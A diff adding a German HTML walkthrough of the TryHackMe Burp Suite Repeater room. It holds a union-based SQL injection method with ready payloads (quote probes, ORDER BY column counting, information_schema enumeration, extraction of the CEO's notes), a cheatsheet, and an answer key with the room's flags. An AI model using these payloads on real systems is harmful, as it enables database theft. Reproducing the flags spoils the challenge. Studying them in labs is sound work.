+        In realen Anwendungen sollten 500-Fehler niemals Stack-Traces oder interne Details preisgeben. Fehlerbehandlung ist ein kritischer Sicherheitsaspekt (Security Misconfiguration — OWASP A05:2021).
+      </div>
+    </div>
+
+    <div class="flag-box">
+      <span class="flag-icon">&#x1F6A9;</span>
+      <div>
+        <div class="flag-label">Task 2 – Flag</div>
+        <div class="flag-value">THM{N2MzMzFhMTBjMmIzZGExNmRmMjE2YzNj}</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════ 7 TASK 3 ═══════════════════ -->
+  <section id="task3">
+    <h2><span class="num">7</span> Task 3 – Union SQL Injection</h2>
+
+    <div class="card danger">
+      <strong>Ziel:</strong> Eine Union-Based SQL Injection im <code>/about/&lt;ID&gt;</code>-Endpunkt ausnutzen, um die Notizen des CEO aus der Datenbank zu exfiltrieren.
+    </div>
+
+    <h3>Was ist Union-Based SQLi?</h3>
+    <p>Bei einer <strong>Union-Based SQL Injection</strong> wird der <code>UNION</code>-Operator genutzt, um eine zusätzliche SELECT-Abfrage an die originale Datenbankabfrage anzuhängen. Das Ergebnis der eingeschleusten Abfrage wird dann zusammen mit den originalen Daten zurückgegeben.</p>
+
+    <div class="card warning">
+      <strong>Voraussetzungen für UNION SQLi:</strong>
+      <ul style="margin-top:8px;padding-left:20px;font-size:14px;">
+        <li>Beide SELECT-Abfragen müssen die <strong>gleiche Anzahl an Spalten</strong> haben</li>
+        <li>Die Datentypen der Spalten müssen <strong>kompatibel</strong> sein</li>
+        <li>Die Anwendung muss die Ergebnisse im Response <strong>anzeigen</strong></li>
+      </ul>
+    </div>
+
+    <div class="steps">
+      <div class="step">
+        <div class="step-num"></div>
+        <div class="step-content">
+          <strong>Request abfangen</strong>
+          <p>Einen Aufruf von <code>/about/1</code> im Proxy abfangen und an den Repeater senden.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num"></div>
+        <div class="step-content">
+          <strong>Verwundbarkeit bestätigen</strong>
+          <p>Ein Apostroph ans Ende der ID anhängen um einen SQL-Fehler auszulösen:</p>
+          <pre><code><span class="kw">GET</span> /about/<span class="str">1'</span> HTTP/1.1</code></pre>
+          <p>Ein Datenbank-Fehler bestätigt die Verwundbarkeit. Der Fehlermeldung entnehmen wir den Tabellennamen: <code>people</code></p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num"></div>
+        <div class="step-content">
+          <strong>Spaltenanzahl ermitteln</strong>
+          <p>Mit <code>ORDER BY</code> die Anzahl der Spalten herausfinden:</p>
+          <pre><code><span class="kw">GET</span> /about/<span class="num">1</span> <span class="kw">ORDER BY</span> <span class="num">1</span><span class="cmt">--</span>   <span class="cmt">→ OK</span>
+<span class="kw">GET</span> /about/<span class="num">1</span> <span class="kw">ORDER BY</span> <span class="num">2</span><span class="cmt">--</span>   <span class="cmt">→ OK</span>
+<span class="kw">GET</span> /about/<span class="num">1</span> <span class="kw">ORDER BY</span> <span class="num">5</span><span class="cmt">--</span>   <span class="cmt">→ OK</span>
+<span class="kw">GET</span> /about/<span class="num">1</span> <span class="kw">ORDER BY</span> <span class="num">6</span><span class="cmt">--</span>   <span class="cmt">→ Fehler → 5 Spalten!</span></code></pre>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num"></div>
+        <div class="step-content">
+          <strong>Spaltennamen aus information_schema lesen</strong>
+          <p>Spaltennamen der Tabelle <code>people</code> aus dem Systemkatalog auslesen:</p>
+          <pre><code><span class="kw">GET</span> /about/<span class="num">0</span> <span class="kw">UNION ALL SELECT</span>
+  <span class="fn">group_concat</span>(column_name),
+  null,null,null,null
+<span class="kw">FROM</span> information_schema.columns
+<span class="kw">WHERE</span> table_name=<span class="str">"people"</span><span class="cmt">--</span></code></pre>
+          <p>Ergebnis: <code>id, name, position, notes, pfp</code></p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num"></div>
+        <div class="step-content">
+          <strong>Zieldaten exfiltrieren</strong>
+          <p>Die <code>notes</code>-Spalte des CEO (ID=1) aus der <code>people</code>-Tabelle auslesen:</p>
+          <pre><code><span class="kw">GET</span> /about/<span class="num">0</span> <span class="kw">UNION ALL SELECT</span>
+  notes,null,null,null,null
+<span class="kw">FROM</span> people
+<span class="kw">WHERE</span> id=<span class="num">1</span><span class="cmt">--</span></code></pre>
+          <p>In der Response erscheinen die CEO-Notizen mit der enthaltenen Flag.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="flag-box">
+      <span class="flag-icon">&#x1F6A9;</span>
+      <div>
+        <div class="flag-label">Task 3 – Flag (in CEO Notes)</div>
+        <div class="flag-value">THM{ZGE3OTUyZGMyMzkzNmZlZGFkMzNiNGRh}</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════ 8 SQLi METHODIK ═══════════════════ -->
+  <section id="sqli">
+    <h2><span class="num">8</span> SQLi Methodik im Detail</h2>
+
+    <p>Die vollständige Methodik für Union-Based SQL Injection, wie im TryHackMe-Modul demonstriert:</p>
+
+    <h3>Phase 1: Reconnaissance</h3>
+    <div class="card">
+      <p>Zuerst wird die Verwundbarkeit durch Sonderzeichen bestätigt. Der einfachste Test ist ein einzelner Apostroph:</p>
+      <pre><code><span class="cmt">-- Test auf SQL Injection</span>
+/about/<span class="str">1'</span>
+/about/<span class="str">1"</span>
+/about/<span class="str">1`</span>
+
+<span class="cmt">-- Erwartete Reaktion bei verwundbarer Anwendung:</span>
+<span class="cmt">-- HTTP 500 oder Datenbankfehlermeldung</span></code></pre>
+    </div>
+
+    <h3>Phase 2: Spaltenanzahl bestimmen</h3>
+    <div class="card">
+      <p>Zwei Methoden zur Ermittlung der Spaltenanzahl:</p>
+      <div class="grid-2">
+        <div>
+          <p style="font-size:12px;color:var(--text-muted);margin-bottom:8px;">METHODE 1: ORDER BY</p>
+          <pre><code><span class="cmt">-- Erhöhen bis Fehler</span>
+/about/<span class="num">1</span> <span class="kw">ORDER BY</span> <span class="num">1</span><span class="cmt">--</span>
+/about/<span class="num">1</span> <span class="kw">ORDER BY</span> <span class="num">2</span><span class="cmt">--</span>
+/about/<span class="num">1</span> <span class="kw">ORDER BY</span> <span class="num">3</span><span class="cmt">--</span>
+<span class="cmt">...</span>
+<span class="cmt">-- Fehler bei N → N-1 Spalten</span></code></pre>
+        </div>
+        <div>
+          <p style="font-size:12px;color:var(--text-muted);margin-bottom:8px;">METHODE 2: UNION SELECT NULL</p>
+          <pre><code><span class="cmt">-- NULLs hinzufügen bis OK</span>
+<span class="kw">UNION SELECT</span> null<span class="cmt">--</span>
+<span class="kw">UNION SELECT</span> null,null<span class="cmt">--</span>
+<span class="kw">UNION SELECT</span> null,null,null<span class="cmt">--</span>
+<span class="cmt">...</span>
+<span class="cmt">-- Kein Fehler → Anzahl gefunden</span></code></pre>
+        </div>
+      </div>
+    </div>
+
+    <h3>Phase 3: Datenbankstruktur auslesen</h3>
+    <div class="card">
+      <pre><code><span class="cmt">-- Alle Tabellen in der aktuellen Datenbank</span>
+/about/<span class="num">0</span> <span class="kw">UNION ALL SELECT</span>
+  <span class="fn">group_concat</span>(table_name),null,null,null,null
+<span class="kw">FROM</span> information_schema.tables
+<span class="kw">WHERE</span> table_schema=database()<span class="cmt">--</span>
+
+<span class="cmt">-- Alle Spalten einer spezifischen Tabelle</span>
+/about/<span class="num">0</span> <span class="kw">UNION ALL SELECT</span>
+  <span class="fn">group_concat</span>(column_name),null,null,null,null
+<span class="kw">FROM</span> information_schema.columns
+<span class="kw">WHERE</span> table_name=<span class="str">"people"</span><span class="cmt">--</span></code></pre>
+      <div class="callout tip" style="margin-top:12px;">
+        <span class="callout-icon">&#x1F4A1;</span>
+        <div class="callout-body">
+          <strong>Warum ID=0?</strong> Durch die Verwendung von <code>0</code> als ID statt <code>1</code> stellen wir sicher, dass die originale Abfrage keine Zeilen zurückgibt — so erscheinen nur die Daten aus unserem UNION-Select in der Response.
+        </div>
+      </div>
+    </div>
+
+    <h3>Phase 4: Daten exfiltrieren</h3>
+    <div class="card">
+      <pre><code><span class="cmt">-- Gezielte Datenextraktion: CEO-Notizen</span>
+/about/<span class="num">0</span> <span class="kw">UNION ALL SELECT</span>
+  notes,       <span class="cmt">-- Zielspalte</span>
+  null,        <span class="cmt">-- Platzhalter</span>
+  null,
+  null,
+  null
+<span class="kw">FROM</span> people
+<span class="kw">WHERE</span> id=<span class="num">1</span>   <span class="cmt">-- CEO hat ID 1</span>
+<span class="cmt">--</span>           <span class="cmt">-- Rest der originalen Abfrage auskommentieren</span></code></pre>
+    </div>
+
+    <h3>URL-Kodierung beachten</h3>
+    <div class="card warning">
+      <p>Manche Sonderzeichen müssen URL-kodiert werden, wenn sie direkt in der URL stehen. Im Repeater kann der Request-Body oder der URL-Pfad direkt ohne Kodierung bearbeitet werden — Burp übernimmt die Kodierung beim Senden.</p>
+      <table style="margin-top:12px;">
+        <thead><tr><th>Zeichen</th><th>URL-Kodiert</th><th>Bedeutung</th></tr></thead>
+        <tbody>
+          <tr><td><code>'</code></td><td><code>%27</code></td><td>String-Delimiter</td></tr>
+          <tr><td><code>"</code></td><td><code>%22</code></td><td>String-Delimiter</td></tr>
+          <tr><td><code> </code></td><td><code>%20</code> / <code>+</code></td><td>Leerzeichen</td></tr>
+          <tr><td><code>#</code></td><td><code>%23</code></td><td>MySQL-Kommentar</td></tr>
+          <tr><td><code>--</code></td><td><code>--+-</code></td><td>SQL-Kommentar</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ═══════════════════ 9 ANSWERS ═══════════════════ -->
+  <section id="answers">
+    <h2><span class="num">9</span> Alle Fragen &amp; Antworten</h2>
+
+    <h3>Task 1 – Burp Suite Repeater: The Basics</h3>
+
+    <div class="answer-box">
+      <div class="q-label">Q1</div>
+      <div>
+        <div class="q-text">What are the options in the Inspector request attributes? (Separated by commas)</div>
+        <div class="a-text">method, path, http version (query parameters, body parameters, request cookies, request headers)</div>
+      </div>
+    </div>
+
+    <div class="answer-box">
+      <div class="q-label">Q2</div>
+      <div>
+        <div class="q-text">Add the header "FlagAuthorised: True" to the request. What is the flag?</div>
+        <div class="a-text">THM{Yzg5NTU2NDM0YWI1ZDNiOTc1NjBhNjUz}</div>
+      </div>
+    </div>
+
+    <h3>Task 2 – Repeater Practical</h3>
+
+    <div class="answer-box">
+      <div class="q-label">Q1</div>
+      <div>
+        <div class="q-text">Try sending a request to /products/1 — what is the flag here?</div>
+        <div class="a-text">THM{N2MzMzFhMTBjMmIzZGExNmRmMjE2YzNj}</div>
+      </div>
+    </div>
+
+    <div class="answer-box">
+      <div class="q-label">Q2</div>
+      <div>
+        <div class="q-text">Send a request with a non-numeric ID (e.g., /products/abc) — what HTTP status code do you get?</div>
+        <div class="a-text">500</div>
+      </div>
+    </div>
+
+    <h3>Task 3 – Union SQL Injection Challenge</h3>
+
+    <div class="answer-box">
+      <div class="q-label">Q1</div>
+      <div>
+        <div class="q-text">What is the flag hidden in the CEO's notes?</div>
+        <div class="a-text">THM{ZGE3OTUyZGMyMzkzNmZlZGFkMzNiNGRh}</div>
+      </div>
+    </div>
+
+    <div class="answer-box">
+      <div class="q-label">Q2</div>
+      <div>
+        <div class="q-text">What table name was revealed in the error message?</div>
+        <div class="a-text">people</div>
+      </div>
+    </div>
+
+    <div class="answer-box">
+      <div class="q-label">Q3</div>
+      <div>
+        <div class="q-text">How many columns does the table have?</div>
+        <div class="a-text">5</div>
+      </div>
+    </div>
+
+    <div class="answer-box">
+      <div class="q-label">Q4</div>
+      <div>
+        <div class="q-text">What are the column names? (as shown by information_schema)</div>
+        <div class="a-text">id, name, position, notes, pfp</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════ 10 FAZIT ═══════════════════ -->
+  <section id="fazit">
+    <h2><span class="num">10</span> Fazit &amp; Cheatsheet</h2>
+
+    <div class="card success">
+      <strong style="color:var(--green)">Lernziele erreicht</strong>
+      <ul style="margin-top:10px;padding-left:20px;font-size:14px;">
+        <li>Repeater-Interface verstanden und alle Bereiche kennen gelernt</li>
+        <li>Custom HTTP-Header manuell hinzufügen</li>
+        <li>Server-Fehler gezielt auslösen und auswerten</li>
+        <li>Union-Based SQL Injection vollständig durchgeführt</li>
+        <li>information_schema zur Datenbankrekonstruktion genutzt</li>
+      </ul>
+    </div>
+
+    <h3>Repeater Cheatsheet</h3>
+    <table>
+      <thead><tr><th>Aktion</th><th>Shortcut / Weg</th></tr></thead>
+      <tbody>
+        <tr><td>Request an Repeater senden</td><td><kbd>Ctrl+R</kbd> im Proxy</td></tr>
+        <tr><td>Request absenden</td><td><kbd>Ctrl+Space</kbd> oder <em>Send</em>-Button</td></tr>
+        <tr><td>In History navigieren</td><td><kbd>Ctrl+Z</kbd> / <kbd>Ctrl+Y</kbd></td></tr>
+        <tr><td>Request suchen</td><td><kbd>Ctrl+F</kbd> im Request/Response-Feld</td></tr>
+        <tr><td>Request kopieren als curl</td><td>Rechtsklick → <em>Copy as curl command</em></td></tr>
+        <tr><td>Neuer Repeater-Tab</td><td><kbd>Ctrl+T</kbd></td></tr>
+        <tr><td>Inspector togglen</td><td>Inspector-Icon in der Toolbar</td></tr>
+      </tbody>
+    </table>
+
+    <h3>SQL Injection Quick Reference</h3>
+    <pre><code><span class="cmt">-- 1. Verwundbarkeit testen</span>
+/endpoint/<span class="str">1'</span>                      <span class="cmt">→ Fehler = verwundbar</span>
+
+<span class="cmt">-- 2. Spaltenanzahl (ORDER BY)</span>
+/endpoint/<span class="num">1</span> <span class="kw">ORDER BY</span> N<span class="cmt">--</span>        <span class="cmt">→ erhöhen bis Fehler</span>
+
+<span class="cmt">-- 3. Tabellen auflisten</span>
+/endpoint/<span class="num">0</span> <span class="kw">UNION ALL SELECT</span> <span class="fn">group_concat</span>(table_name),null,...
+<span class="kw">FROM</span> information_schema.tables <span class="kw">WHERE</span> table_schema=<span class="fn">database</span>()<span class="cmt">--</span>
+
+<span class="cmt">-- 4. Spalten einer Tabelle</span>
+/endpoint/<span class="num">0</span> <span class="kw">UNION ALL SELECT</span> <span class="fn">group_concat</span>(column_name),null,...
+<span class="kw">FROM</span> information_schema.columns <span class="kw">WHERE</span> table_name=<span class="str">"zieltabelle"</span><span class="cmt">--</span>
+
+<span class="cmt">-- 5. Daten exfiltrieren</span>
+/endpoint/<span class="num">0</span> <span class="kw">UNION ALL SELECT</span> spalte,null,null,...
+<span class="kw">FROM</span> zieltabelle <span class="kw">WHERE</span> id=<span class="num">1</span><span class="cmt">--</span></code></pre>
+
+    <div class="callout danger" style="margin-top:24px;">
+      <span class="callout-icon">&#x26A0;&#xFE0F;</span>
+      <div class="callout-body">
+        <strong>Rechtlicher Hinweis</strong>
+        SQL Injection und andere hier gezeigte Techniken dürfen ausschließlich in autorisierten Umgebungen (CTFs, eigene Lab-Systeme, Penetrationstest mit schriftlicher Genehmigung) eingesetzt werden. Unbefugter Einsatz ist strafbar.
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<!-- ═══════════════════ FOOTER ═══════════════════ -->
+<footer>
+  <p>TryHackMe &mdash; Junior Penetration Tester &mdash; Burp Suite: Repeater</p>
+  <p style="margin-top:6px;">Writeup basiert auf dem <a href="https://tryhackme.com" target="_blank">TryHackMe</a>-Kurs &amp; dem Walkthrough von <a href="https://rahulk2903.medium.com" target="_blank">rahulk2903</a></p>
+  <p style="margin-top:6px;font-size:12px;color:#484f58;">Erstellt am 26.05.2026 &mdash; Nur für Lernzwecke</p>
+</footer>
+
+</body>
+</html>
